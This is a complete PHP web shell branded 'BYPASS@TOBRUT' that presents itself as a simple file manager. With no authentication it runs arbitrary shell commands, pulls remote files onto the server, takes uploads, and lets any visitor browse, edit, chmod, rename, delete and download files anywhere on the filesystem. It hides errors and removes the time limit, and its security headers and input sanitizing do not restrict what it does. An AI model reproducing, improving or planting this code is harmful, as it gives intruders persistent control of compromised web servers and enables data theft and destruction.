<?php
// Security Headers
header("X-XSS-Protection: 1; mode=block");
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("Strict-Transport-Security: max-age=31536000; includeSubDomains");
header("Referrer-Policy: no-referrer");
header("X-Powered-By: none");

// Start output buffering and prevent script timeout
ob_start();
set_time_limit(0);

// Hide errors from being displayed
error_reporting(0);
ini_set('display_errors', 0);

// Function to sanitize user input
function sanitize_input($data) {
    return htmlspecialchars(strip_tags(trim($data)), ENT_QUOTES, 'UTF-8');
}

// Check if certain critical functions are disabled
$disabled_functions = explode(',', ini_get('disable_functions'));
$disabled_functions = array_map('trim', $disabled_functions);

function safe_exec($cmd) {
    global $disabled_functions;
    if (in_array('shell_exec', $disabled_functions)) {
        return "Error: shell_exec is disabled on this server.";
    }
    return shell_exec($cmd);
}

function safe_file_put_contents($filename, $data) {
    global $disabled_functions;
    if (in_array('file_put_contents', $disabled_functions)) {
        return "Error: file_put_contents is disabled on this server.";
    }
    return file_put_contents($filename, $data);
}

function safe_fopen($url) {
    global $disabled_functions;
    if (in_array('fopen', $disabled_functions)) {
        return "Error: fopen is disabled on this server.";
    }
    return fopen($url, 'r');
}

// Display the interface
echo '<html><head><title>BYPASS@TOBRUT</title>';
echo '<style>
    body { font-family: Arial, sans-serif; background-color: #2c2f33; color: #fff; margin: 0; padding: 0; }
    h1 { color: #7289da; text-align: center; }
    input[type="text"], input[type="url"], input[type="submit"] { padding: 10px; margin: 10px; width: 300px; border-radius: 5px; border: none; }
    input[type="submit"] { background-color: #7289da; color: white; cursor: pointer; }
    table { width: 90%; margin: 20px auto; border-collapse: collapse; }
    th, td { padding: 10px; text-align: left; border: 1px solid #444; color: #fff; }
    th { background-color: #7289da; }
    a { color: #7289da; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .container { width: 80%; margin: 0 auto; }
    textarea { font-size: 14px; width: 100%; height: 600px; background-color: #23272a; color: #eee; border: none; padding: 10px; }
</style></head><body>';

// Container div
echo '<div class="container">';
echo '<h1>@TOBRUT</h1>';
echo '<p>This is a simple file manager tool created by TOBRUT.</p>';

// Command execution form
echo '<form method="post">
        <input type="text" name="cmd" placeholder="Enter command" required />
        <input type="submit" value="Execute" />
      </form>';

// Handle command execution
if (isset($_POST['cmd'])) {
    $cmd = sanitize_input($_POST['cmd']);
    echo '<pre>' . htmlspecialchars(safe_exec($cmd)) . '</pre>';
}

// Remote upload form
echo '<form method="post">
        <input type="url" name="remote_url" placeholder="Remote File URL" required />
        <input type="submit" value="Remote Upload" />
      </form>';

// Remote upload handling
if (isset($_POST['remote_url'])) {
    $remote_url = sanitize_input($_POST['remote_url']);
    $file_name = basename($remote_url);
    if (safe_file_put_contents($file_name, safe_fopen($remote_url))) {
        echo '<p><font color="green">Remote file uploaded successfully as ' . $file_name . '</font></p>';
    } else {
        echo '<p><font color="red">Remote upload failed.</font></p>';
    }
}

// File search form
echo '<form method="get">
        <input type="text" name="search" placeholder="Search files or folders" />
        <input type="submit" value="Search" />
      </form>';

// Directory navigation and file display
$HX = isset($_GET['HX']) ? sanitize_input($_GET['HX']) : getcwd();
$HX = str_replace('\\', '/', $HX);
$paths = explode('/', $HX);

foreach ($paths as $id => $pat) {
    if ($pat == '' && $id == 0) {
        echo '<a href="?HX=/">/</a>';
        continue;
    }
    if ($pat == '') continue;
    echo '<a href="?HX=';
    for ($i = 0; $i <= $id; $i++) {
        echo "$paths[$i]";
        if ($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}

// File upload form
echo '<br><br><form enctype="multipart/form-data" method="POST">
        <input type="file" name="file" required />
        <input type="submit" value="Upload" />
      </form>';

// File upload handling
if (isset($_FILES['file'])) {
    if (move_uploaded_file($_FILES['file']['tmp_name'], $HX . '/' . $_FILES['file']['name'])) {
        echo '<p><font color="green">File uploaded successfully.</font></p>';
    } else {
        echo '<p><font color="red">File upload failed.</font></p>';
    }
}

// Display files and directories
echo '<table>';
$scandir = scandir($HX);
if (isset($_GET['search'])) {
    $search_query = strtolower(sanitize_input($_GET['search']));
    $scandir = array_filter($scandir, function($file) use ($search_query) {
        return strpos(strtolower($file), $search_query) !== false;
    });
}
foreach ($scandir as $item) {
    if ($item == '.' || $item == '..') continue;
    $path = "$HX/$item";
    $isDir = is_dir($path) ? 'Directory' : 'File';
    $size = is_file($path) ? filesize($path) : '-';
    echo "<tr>
            <td>$isDir</td>
            <td><a href=\"?HX=$path\">$item</a></td>
            <td>$size</td>
            <td><a href=\"?option=edit&HX=$path\">Edit</a> | 
                <a href=\"?option=chmod&HX=$path\">Chmod</a> | 
                <a href=\"?option=rename&HX=$path\">Rename</a> | 
                <a href=\"?option=delete&HX=$path\" onclick=\"return confirm('Are you sure?')\">Delete</a> |
                <a href=\"?download=$path\">Download</a>
            </td>
          </tr>";
}
echo '</table>';

// File download handling
if (isset($_GET['download'])) {
    $file = sanitize_input($_GET['download']);
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename='.basename($file));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        flush();
        readfile($file);
        exit;
    } else {
        echo '<p><font color="red">File not found.</font></p>';
    }
}

// File edit, rename, chmod, delete handling
if (isset($_GET['option'])) {
    $option = sanitize_input($_GET['option']);
    $file = sanitize_input($_GET['HX']);

    if ($option == 'edit') {
        if (isset($_POST['content'])) {
            safe_file_put_contents($file, sanitize_input($_POST['content']));
        }
        echo '<form method="post">
                <textarea name="content">' . htmlspecialchars(file_get_contents($file)) . '</textarea>
                <input type="submit" value="Save" />
              </form>';
    } elseif ($option == 'chmod') {
        if (isset($_POST['chmod'])) {
            chmod($file, octdec($_POST['chmod']));
        }
        echo '<form method="post">
                <input type="text" name="chmod" value="' . substr(sprintf('%o', fileperms($file)), -4) . '" />
                <input type="submit" value="Change Permission" />
              </form>';
    } elseif ($option == 'rename') {
        if (isset($_POST['newname'])) {
            rename($file, dirname($file) . '/' . sanitize_input($_POST['newname']));
        }
        echo '<form method="post">
                <input type="text" name="newname" value="' . basename($file) . '" />
                <input type="submit" value="Rename" />
              </form>';
    } elseif ($option == 'delete') {
        if (unlink($file)) {
            echo '<p><font color="green">File deleted successfully.</font></p>';
        } else {
            echo '<p><font color="red">Failed to delete file.</font></p>';
        }
    }
}

echo '</div></body></html>';
?>
